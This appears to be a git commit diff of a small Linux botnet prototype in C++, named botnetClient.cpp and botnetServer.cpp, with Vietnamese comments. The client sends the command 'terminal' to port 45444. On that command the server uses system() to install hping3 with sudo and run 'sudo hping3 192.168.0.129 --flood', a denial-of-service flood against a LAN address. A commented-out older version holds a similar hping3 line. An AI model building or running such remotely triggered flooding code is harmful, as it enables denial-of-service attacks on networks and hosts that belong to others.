be5aa00f525f5c4a4104d27fa2120f63dcbae9be
phamminh03 <phamvanminh025@gmail.com>
2024-09-24 18:54:55 +0700

    commit 2nd

--- botnetClient.cpp
+++ botnetClient.cpp
@@ -1,91 +1,126 @@
-#include <bits/stdc++.h>
-#include <sys/socket.h>
+// #include <bits/stdc++.h>
+// #include <sys/socket.h>
+// #include <arpa/inet.h>
+// #include <netdb.h>
+// #include <unistd.h>  // for close() and usleep() functions
+// #include <string>
+// #include <cstdlib>
+
+// using namespace std;
+
+// int skt;  // Use int instead of SOCKET on Linux
+
+// void ConnectSocket()
+// {
+//     // Initialize socket (no WSAStartup needed on Linux)
+//     skt = socket(AF_INET, SOCK_STREAM, 0);
+//     if (skt < 0) {
+//         cerr << "Socket creation failed" << endl;
+//         return;
+//     }
+
+//     struct hostent* host;
+//     host = gethostbyname("127.0.0.1");  // Resolve hostname
+
+//     struct sockaddr_in sockAddr;
+//     sockAddr.sin_port = htons(45444);
+//     sockAddr.sin_family = AF_INET;
+//     sockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);  // Set IP address
+
+//     if (connect(skt, (struct sockaddr*)&sockAddr, sizeof(sockAddr)) != 0) {
+//         cerr << "Socket connection failed" << endl;
+//         return;
+//     }
+// }
+
+// void CloseSocket()
+// {
+//     close(skt);  // Use close() instead of closesocket() on Linux
+// }
+
+// string PoolCommand()
+// {
+//     ConnectSocket();
+
+//     if (skt > 0)  // Check if socket is valid
+//     {
+//         string req = "poll";
+//         send(skt, req.c_str(), req.length(), 0);
+
+//         int bufferLength = 4096;
+//         char buffer[4096];
+
+//         int received = recv(skt, buffer, bufferLength, 0);
+//         if (received > 0) {
+//             cout << "Received data: " << string(buffer, buffer + received) << endl;
+//             CloseSocket();
+//         }
+//         else
+//         {
+//             cout << "No data received or error occurred." << endl;
+//         }
+//     }
+//     CloseSocket();
+//     return "";
+// }
+
+// int main()
+// {
+//     string lastCommand = "";
+    
+//     while (true)
+//     {
+//         string command = PoolCommand();
+//         if (command.length() > 0 && command != lastCommand)
+//         {
+//             lastCommand = command;
+
+//             if (command.find("say") == 0)
+//             {
+//                 string title = command.substr(3, command.find("\\") - 3);
+//                 string msg = command.substr(command.find("\\") + 1);
+//                 // Print to console instead of using MessageBoxA
+//                 cout << "Title: " << title << endl;
+//                 cout << "Message: " << msg << endl;
+//             }
+//         }
+//         usleep(5000 * 1000);  // Sleep for 5000 milliseconds (usleep uses microseconds)
+//     }
+
+//     return 0;
+// }
+
+#include <iostream>
+#include <cstring>
+#include <unistd.h>
 #include <arpa/inet.h>
-#include <netdb.h>
-#include <unistd.h>  // for close() and usleep() functions
-#include <string>
-#include <cstdlib>
 
 using namespace std;
 
-int skt;  // Use int instead of SOCKET on Linux
-
-void ConnectSocket()
+int main() 
 {
-    // Initialize socket (no WSAStartup needed on Linux)
-    skt = socket(AF_INET, SOCK_STREAM, 0);
-    if (skt < 0) {
-        cerr << "Socket creation failed" << endl;
-        return;
-    }
-
-    struct hostent* host;
-    host = gethostbyname("127.0.0.1");  // Resolve hostname
-
-    struct sockaddr_in sockAddr;
-    sockAddr.sin_port = htons(45444);
-    sockAddr.sin_family = AF_INET;
-    sockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);  // Set IP address
-
-    if (connect(skt, (struct sockaddr*)&sockAddr, sizeof(sockAddr)) != 0) {
-        cerr << "Socket connection failed" << endl;
-        return;
-    }
-}
-
-void CloseSocket()
-{
-    close(skt);  // Use close() instead of closesocket() on Linux
-}
-
-string PoolCommand()
-{
-    ConnectSocket();
-
-    if (skt > 0)  // Check if socket is valid
+    int clientSocket = socket(AF_INET, SOCK_STREAM, 0);
+    if (clientSocket == -1) 
     {
-        string req = "poll";
-        send(skt, req.c_str(), req.length(), 0);
-
-        int bufferLength = 4096;
-        char buffer[4096];
-
-        int received = recv(skt, buffer, bufferLength, 0);
-        if (received > 0) {
-            cout << "Received data: " << string(buffer, buffer + received) << endl;
-            CloseSocket();
-        }
-        else
-        {
-            cout << "No data received or error occurred." << endl;
-        }
+        cerr << "Error creating socket!" << endl;
+        return -1;
     }
-    CloseSocket();
-    return "";
-}
 
-int main()
-{
-    string lastCommand = "";
-    
-    while (true)
+    sockaddr_in serverAddr;
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(45444);
+    inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr);
+
+    if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) 
     {
-        string command = PoolCommand();
-        if (command.length() > 0 && command != lastCommand)
-        {
-            lastCommand = command;
-
-            if (command.find("say") == 0)
-            {
-                string title = command.substr(3, command.find("\\") - 3);
-                string msg = command.substr(command.find("\\") + 1);
-                // Print to console instead of using MessageBoxA
-                cout << "Title: " << title << endl;
-                cout << "Message: " << msg << endl;
-            }
-        }
-        usleep(5000 * 1000);  // Sleep for 5000 milliseconds (usleep uses microseconds)
+        cerr << "Connection failed!" << endl;
+        return -1;
     }
 
+    // Gửi lệnh mở terminal
+    string request = "terminal";
+    send(clientSocket, request.c_str(), request.size(), 0);
+
+    close(clientSocket);
     return 0;
 }
--- botnetServer.cpp
+++ botnetServer.cpp
@@ -1,126 +1,29 @@
-#include <bits/stdc++.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-#include <unistd.h>  // for close() and sleep() functions
-#include <thread>
-#include <string>
-#include <cstdlib>
-using namespace std;
-
-static int PORT = 45444;
-
-int serverSocket;  // Using int instead of SOCKET in POSIX
-
-string currCommand = "";
-
-// Clear screen for Linux (WSL)
-void clearScreen() {
-    cout << "\033[2J\033[1;1H";  // ANSI escape code to clear terminal
-}
-
-void TaskInput()
-{
-    while (true)
-    {
-        clearScreen();
-        cout << "Current Command: " << currCommand << endl;
-        cout << "Type a new command: ";
-
-        string response;
-        getline(cin, response);
-
-        currCommand = response;
-
-        usleep(1000);  // Sleep for 1 millisecond (in microseconds)
-    }
-}
-
-int main()
-{
-    thread threadInput(TaskInput);  // Start the input thread
-
-    // Initialize socket
-    struct sockaddr_in sockAddr;
-    sockAddr.sin_port = htons(PORT);
-    sockAddr.sin_family = AF_INET;
-    sockAddr.sin_addr.s_addr = htonl(INADDR_ANY);
-
-    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
-    if (serverSocket < 0) {
-        cerr << "Socket creation failed" << endl;
-        return 1;
-    }
-
-    if (bind(serverSocket, (struct sockaddr*)&sockAddr, sizeof(sockAddr)) < 0) {
-        cerr << "Socket bind failed" << endl;
-        close(serverSocket);
-        return -1;
-    }
-
-    if (listen(serverSocket, 10) < 0) {
-        cerr << "Socket listen failed" << endl;
-        close(serverSocket);
-        return 1;
-    }
-
-    cout << "Server started on port: " << PORT << endl;
-
-    while (true)
-    {
-        struct sockaddr_in clientAddr;
-        socklen_t clientSize = sizeof(clientAddr);
-        int clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientSize);
-
-        if (clientSocket < 0) {
-            cerr << "Failed to accept connection" << endl;
-            continue;
-        }
-
-        int bufferLength = 4096;
-        char buffer[4096];
-
-        int iResult = recv(clientSocket, buffer, bufferLength, 0);
-        if (iResult < 0) {
-            cerr << "Error receiving data" << endl;
-            close(clientSocket);
-            continue;
-        }
-
-        string request = string(buffer, buffer + iResult);
-
-        if (request == "poll")
-        {
-            cout << "Sending command: " << currCommand << endl;
-            send(clientSocket, currCommand.c_str(), currCommand.length(), 0);
-        }
-
-        close(clientSocket);  // Close client socket (use close() in POSIX)
-        usleep(1000);  // Sleep for 1 millisecond
-    }
-
-    close(serverSocket);  // Close server socket (use close() in POSIX)
-    return 0;
-}
-
-// #include <iostream>
-// #include <thread>
-// #include <cstring>
-// #include <unistd.h>       // Thư viện cho Linux (để dùng hàm sleep và close)
-// #include <arpa/inet.h>    // Thư viện socket cho Linux
+// #include <bits/stdc++.h>
 // #include <sys/socket.h>
 // #include <netinet/in.h>
-// #include <cstdlib>        // Thư viện cho hàm system()
-
+// #include <arpa/inet.h>
+// #include <unistd.h>  // for close() and sleep() functions
+// #include <thread>
+// #include <string>
+// #include <cstdlib>
 // using namespace std;
 
 // static int PORT = 45444;
-// int serverSocket;
+
+// int serverSocket;  // Using int instead of SOCKET in POSIX
+
 // string currCommand = "";
 
-// void TaskInput() {
-//     while (true) {
-//         system("clear");
+// // Clear screen for Linux (WSL)
+// void clearScreen() {
+//     cout << "\033[2J\033[1;1H";  // ANSI escape code to clear terminal
+// }
+
+// void TaskInput()
+// {
+//     while (true)
+//     {
+//         clearScreen();
 //         cout << "Current Command: " << currCommand << endl;
 //         cout << "Type a new command: ";
 
@@ -129,69 +32,169 @@ int main()
 
 //         currCommand = response;
 
-//         sleep(1);  // Dừng lại trong 1 giây
+//         usleep(1000);  // Sleep for 1 millisecond (in microseconds)
 //     }
 // }
 
-// int main() {
-//     thread threadInput(TaskInput);
+// int main()
+// {
+//     thread threadInput(TaskInput);  // Start the input thread
 
-//     // Tạo socket
+//     // Initialize socket
+//     struct sockaddr_in sockAddr;
+//     sockAddr.sin_port = htons(PORT);
+//     sockAddr.sin_family = AF_INET;
+//     sockAddr.sin_addr.s_addr = htonl(INADDR_ANY);
+
 //     serverSocket = socket(AF_INET, SOCK_STREAM, 0);
-//     if (serverSocket == -1) {
-//         cerr << "Error creating socket!" << endl;
+//     if (serverSocket < 0) {
+//         cerr << "Socket creation failed" << endl;
+//         return 1;
+//     }
+
+//     if (bind(serverSocket, (struct sockaddr*)&sockAddr, sizeof(sockAddr)) < 0) {
+//         cerr << "Socket bind failed" << endl;
+//         close(serverSocket);
 //         return -1;
 //     }
 
-//     sockaddr_in serverAddr;
-//     serverAddr.sin_family = AF_INET;
-//     serverAddr.sin_port = htons(PORT);
-//     serverAddr.sin_addr.s_addr = INADDR_ANY;
-
-//     // Gán socket với địa chỉ IP và cổng
-//     if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
-//         cerr << "Bind failed!" << endl;
-//         return -1;
+//     if (listen(serverSocket, 10) < 0) {
+//         cerr << "Socket listen failed" << endl;
+//         close(serverSocket);
+//         return 1;
 //     }
 
-//     // Lắng nghe kết nối
-//     listen(serverSocket, 10);
+//     cout << "Server started on port: " << PORT << endl;
 
-//     while (true) {
-//         sockaddr_in clientAddr;
+//     while (true)
+//     {
+//         struct sockaddr_in clientAddr;
 //         socklen_t clientSize = sizeof(clientAddr);
 //         int clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientSize);
 
 //         if (clientSocket < 0) {
-//             cerr << "Failed to accept connection!" << endl;
+//             cerr << "Failed to accept connection" << endl;
 //             continue;
 //         }
 
+//         int bufferLength = 4096;
 //         char buffer[4096];
-//         memset(buffer, 0, 4096);
 
-//         // Nhận yêu cầu từ client
-//         int bytesReceived = recv(clientSocket, buffer, 4096, 0);
-//         if (bytesReceived > 0) {
-//             string request(buffer, bytesReceived);
-//             cout << "Received: " << request << endl;
-
-//             // Kiểm tra nếu lệnh từ client là "open_terminal"
-//             if (request == "open_terminal") {
-//                 cout << "Opening terminal..." << endl;
-//                 system("gnome-terminal");  // Mở terminal
-//                 system("sudo apt install hping3");
-//                 system("y");
-//                 system("sudo hping3 192.168.1.20");
-//             } else if (request == "poll") {
-//                 send(clientSocket, currCommand.c_str(), currCommand.length(), 0);
-//             }
+//         int iResult = recv(clientSocket, buffer, bufferLength, 0);
+//         if (iResult < 0) {
+//             cerr << "Error receiving data" << endl;
+//             close(clientSocket);
+//             continue;
 //         }
 
-//         close(clientSocket);
-//         sleep(1);
+//         string request = string(buffer, buffer + iResult);
+
+//         if (request == "poll")
+//         {
+//             cout << "Sending command: " << currCommand << endl;
+//             send(clientSocket, currCommand.c_str(), currCommand.length(), 0);
+//         }
+
+//         close(clientSocket);  // Close client socket (use close() in POSIX)
+//         usleep(1000);  // Sleep for 1 millisecond
 //     }
 
-//     close(serverSocket);
+//     close(serverSocket);  // Close server socket (use close() in POSIX)
 //     return 0;
 // }
+
+#include <iostream>
+#include <thread>
+#include <cstring>
+#include <unistd.h>       // Thư viện cho Linux (để dùng hàm sleep và close)
+#include <arpa/inet.h>    // Thư viện socket cho Linux
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <cstdlib>        // Thư viện cho hàm system()
+
+using namespace std;
+
+static int PORT = 45444;
+int serverSocket;
+string currCommand = "";
+
+void TaskInput() 
+{
+    while (true) 
+    {
+        system("clear");
+        // cout << "Current Command: " << currCommand << endl;
+        // cout << "Type a new command: ";
+
+        // string response;
+        // getline(cin, response);
+
+        // currCommand = response;
+
+        sleep(1); 
+    }
+}
+
+int main() {
+    thread threadInput(TaskInput);
+
+    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
+    if (serverSocket == -1) 
+    {
+        cerr << "Error creating socket!" << endl;
+        return -1;
+    }
+
+    sockaddr_in serverAddr;
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(PORT);
+    serverAddr.sin_addr.s_addr = INADDR_ANY;
+
+    if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) 
+    {
+        cerr << "Bind failed!" << endl;
+        return -1;
+    }
+
+    listen(serverSocket, 10);
+
+    while (true) 
+    {
+        sockaddr_in clientAddr;
+        socklen_t clientSize = sizeof(clientAddr);
+        int clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientSize);
+
+        if (clientSocket < 0) 
+        {
+            cerr << "Failed to accept connection!" << endl;
+            continue;
+        }
+
+        char buffer[4096];
+        memset(buffer, 0, 4096);
+
+        // Nhận yêu cầu từ client
+        int bytesReceived = recv(clientSocket, buffer, 4096, 0);
+        if (bytesReceived > 0) 
+        {
+            string request(buffer, bytesReceived);
+            // cout << "Received: " << request << endl;
+
+            // Kiểm tra nếu lệnh từ client là "open_terminal"
+            if (request == "terminal") 
+            {
+                cout << "Opening terminal..." << endl;
+                system("gnome-terminal");
+                system("sudo apt install hping3");
+                system("y");
+                system("sudo hping3 192.168.0.129 --flood");
+            } 
+        }
+
+        close(clientSocket);
+        sleep(1);
+    }
+
+    close(serverSocket);
+    return 0;
+}
